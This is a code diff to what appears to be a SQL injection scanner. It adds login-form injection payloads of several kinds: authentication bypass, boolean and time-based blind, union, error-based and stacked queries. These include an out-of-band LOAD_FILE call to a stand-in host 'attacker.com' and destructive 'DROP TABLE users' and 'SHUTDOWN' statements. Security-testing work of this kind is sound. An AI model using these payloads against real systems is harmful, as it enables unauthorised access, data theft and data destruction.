@@ -10,7 +10,7 @@ logninputs = ['type="password"',
             '[Ll]og [Ii]n']
 
 
-
+# Added extra payloads to test Boolean and Time Based  blind SQLi, also added some checks for Union Based, Error based, Out of Bound, Stack queries SQLi's 
 payloads = ["' or ''-'", 
             "admin' or '1'='1", 
             "' UNION ALL SELECT 1", 
@@ -20,7 +20,21 @@ payloads = ["' or ''-'",
             "admin' and substring(password/text(),1,1)='7", 
             "' and substring(password/text(),1,1)='7", 
             "' or 1=1 limit 1 -- -+", 
-            "'=or'"]
+            "'=or'",
+            "' OR 'a'='a", 
+            "' OR 'a'='b", 
+            "' OR 1=1 --", 
+            "' OR 1=2 --", 
+            "' OR SLEEP(5) AND '1'='1", 
+            "' OR SLEEP(5) AND '1'='2", 
+            "' UNION SELECT 1,2,3,4,5 --", 
+            "' UNION SELECT NULL,NULL,NULL --", 
+            "' OR SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,CAST(database() AS CHAR),0x27,0x7e)) FROM `information_schema`.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM `information_schema`.tables GROUP BY x)a --", 
+            "' OR (SELECT 1 FROM (SELECT SLEEP(25))A) --", 
+            "' OR (SELECT LOAD_FILE('\\\\attacker.com\\test.txt')) --", 
+            "'; DROP TABLE users; --", 
+            "'; SHUTDOWN; --"]
+
 
 
 # Regex from Ekultek (https://github.com/Ekultek/Zeus-Scanner/blob/master/lib/core/settings.py) with some edits
